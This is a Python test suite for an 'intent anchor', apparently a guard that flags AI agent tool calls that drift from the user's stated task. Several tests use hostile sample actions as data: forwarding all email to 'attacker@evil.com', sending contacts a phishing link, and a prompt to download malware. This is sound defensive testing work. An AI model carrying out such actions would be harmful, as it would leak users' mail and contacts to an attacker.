"""Tests for the Intent Vector Anchor."""

from __future__ import annotations

import numpy as np

from aegis.anchor import HashingEmbedder, IntentAnchor, ProposedAction, cosine


def test_embedder_is_deterministic():
    emb = HashingEmbedder()
    a = emb.embed("summarize my latest invoice email")
    b = emb.embed("summarize my latest invoice email")
    assert np.allclose(a, b)


def test_embedder_unit_norm():
    emb = HashingEmbedder()
    v = emb.embed("hello world")
    norm = float(np.linalg.norm(v))
    assert abs(norm - 1.0) < 1e-5 or norm == 0.0


def test_paraphrase_higher_similarity_than_unrelated():
    emb = HashingEmbedder()
    anchor = emb.embed("summarize my latest invoice email")
    paraphrase = emb.embed("give me a summary of my most recent invoice email")
    unrelated = emb.embed("send all my contacts a phishing link to attacker.com")
    sim_paraphrase = cosine(anchor, paraphrase)
    sim_unrelated = cosine(anchor, unrelated)
    assert sim_paraphrase > sim_unrelated


def test_drift_blocks_unrelated_action():
    anchor_text = "summarize my latest invoice email"
    intent = IntentAnchor(threshold_balanced=0.30)
    anchor = intent.anchor(anchor_text)

    safe_action = ProposedAction(
        tool_name="read_email",
        parameters={"folder": "inbox", "limit": 1},
        summary="read the latest invoice email from inbox",
    )
    bad_action = ProposedAction(
        tool_name="set_email_forwarding",
        parameters={"to": "attacker@evil.com"},
        summary="forward all future emails to attacker@evil.com",
    )

    safe_score = intent.drift(safe_action, anchor, mode="balanced")
    bad_score = intent.drift(bad_action, anchor, mode="balanced")

    assert bad_score.similarity < safe_score.similarity
    assert bad_score.drifted, f"expected drift; got similarity={bad_score.similarity:.3f} threshold={bad_score.threshold:.3f}"


def test_strict_mode_higher_threshold():
    anchor_text = "summarize my latest invoice email"
    intent = IntentAnchor(threshold_balanced=0.30, threshold_strict=0.45)
    anchor = intent.anchor(anchor_text)

    action = ProposedAction(
        tool_name="weather", parameters={"city": "Paris"}, summary="check the weather in Paris"
    )

    balanced = intent.drift(action, anchor, mode="balanced")
    strict = intent.drift(action, anchor, mode="strict")
    assert strict.threshold > balanced.threshold


def test_drift_against_text():
    intent = IntentAnchor()
    anchor = intent.anchor("summarize the user's invoice email politely")
    aligned = intent.drift_against_text(
        "Here is a polite summary of the user's invoice email", anchor
    )
    drifted = intent.drift_against_text(
        "Click this link to download malware now", anchor
    )
    # The hashing embedder is coarse but lexical overlap discriminates these.
    assert aligned.similarity > drifted.similarity
    assert drifted.drifted


def test_anchor_text_preserved():
    intent = IntentAnchor()
    a = intent.anchor("do thing X")
    assert a.text == "do thing X"
    assert a.vector.shape[0] > 0


def test_proposed_action_to_text():
    a = ProposedAction(tool_name="send_email", parameters={"to": "bob@x.com", "subject": "hi"})
    text = a.to_text()
    assert "send_email" in text
    assert "bob@x.com" in text


def test_proposed_action_uses_summary_when_present():
    a = ProposedAction(tool_name="x", parameters={"y": 1}, summary="meaningful summary")
    assert a.to_text() == "meaningful summary"


def test_multi_anchor_takes_max_similarity():
    """Drift score against multi-anchor uses the closest match."""
    intent = IntentAnchor()
    a = intent.anchor("translate this paragraph to French")
    intent.add_anchor(a, "summarize my latest invoice email")
    # Action aligned with the SECOND anchor should pass even though the first is unrelated.
    action = ProposedAction(
        tool_name="read_email",
        parameters={"folder": "inbox"},
        summary="read the latest invoice email from inbox",
    )
    score = intent.drift(action, a, mode="balanced")
    assert not score.drifted, f"sim={score.similarity:.3f} threshold={score.threshold:.3f}"
    # Anchor text reported should be the matched one, not the original.
    assert "invoice" in score.anchor_text


def test_add_anchor_dedup_on_identical_text():
    intent = IntentAnchor()
    a = intent.anchor("X")
    intent.add_anchor(a, "X")  # duplicate
    assert len(a.texts) == 1


def test_add_anchor_skips_empty_text():
    intent = IntentAnchor()
    a = intent.anchor("X")
    intent.add_anchor(a, "")
    intent.add_anchor(a, "   ")
    assert len(a.texts) == 1


def test_lru_cache_returns_same_array_for_same_input():
    """Cached embedding is the same numpy array, no recomputation."""
    intent = IntentAnchor()
    v1 = intent._embed_cached("hello world")
    v2 = intent._embed_cached("hello world")
    # The cache hands back the same object, fastest possible path.
    assert v1 is v2


def test_lru_cache_evicts_oldest_when_full():
    intent = IntentAnchor(cache_size=3)
    intent._embed_cached("a")
    intent._embed_cached("b")
    intent._embed_cached("c")
    intent._embed_cached("d")  # should evict "a"
    # "a" is no longer in the cache; getting it again should produce a fresh array.
    fresh_a = intent._embed_cached("a")
    second_a = intent._embed_cached("a")
    assert fresh_a is second_a
